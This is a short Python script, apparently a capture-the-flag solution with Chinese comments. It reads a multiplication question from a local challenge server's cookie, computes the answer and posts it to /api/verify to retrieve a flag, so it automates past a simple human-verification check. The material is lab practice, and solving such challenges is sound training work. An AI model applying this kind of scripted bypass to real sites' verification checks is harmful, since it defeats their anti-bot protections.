# 没有绕过检测
import requests
import re
import time

# 目标URL
TARGET_URL = "http://127.0.0.1"  # 根据实际情况修改URL

def extract_numbers(question):
    """从题目中提取两个数字"""
    match = re.search(r"(\d+)\s*x\s*(\d+)", question)
    if match:
        return int(match.group(1)), int(match.group(2))
    else:
        raise ValueError(f"无法从题目中提取数字: {question}")

def main():
    print("[+] 开始利用自动计算获取flag...")
    
    # 创建会话以保持cookie
    session = requests.Session()
    
    # 步骤1: 访问验证页面，获取题目
    print("[+] 访问验证页面...")
    response = session.get(f"{TARGET_URL}/complex-verify.html")
    
    # 步骤2: 从cookie中获取题目
    math_question = session.cookies.get('math_question')
    if not math_question:
        print("[-] 无法获取题目")
        return
    
    # 步骤3: 提取并计算答案
    try:
        num1, num2 = extract_numbers(math_question)
        answer = num1 * num2
        print(f"[+] 解析题目: {math_question}")
        print(f"[+] 计算答案: {num1} × {num2} = {answer}")
    except ValueError as e:
        print(f"[-] 题目解析失败: {e}")
        return
    
    # 步骤4: 提交答案
    print("[+] 提交答案...")
    start_time = time.time()
    response = session.post(
        f"{TARGET_URL}/api/verify", 
        json={"answer": answer},
        headers={"Content-Type": "application/json"}
    )
    
    elapsed = time.time() - start_time
    print(f"[+] 响应时间: {elapsed:.2f}秒")
    
    # 步骤5: 解析响应获取flag
    try:
        result = response.json()
        print(f"[+] 服务器响应: {result}")
        
        if response.status_code == 200 and 'flag' in result:
            print(f"[+] 成功获取flag: {result['flag']}")
        else:
            print(f"[-] 未能获取flag: {result.get('message', '未知错误')}")
                
    except Exception as e:
        print(f"[-] 解析响应失败: {e}")

if __name__ == "__main__":
    main()
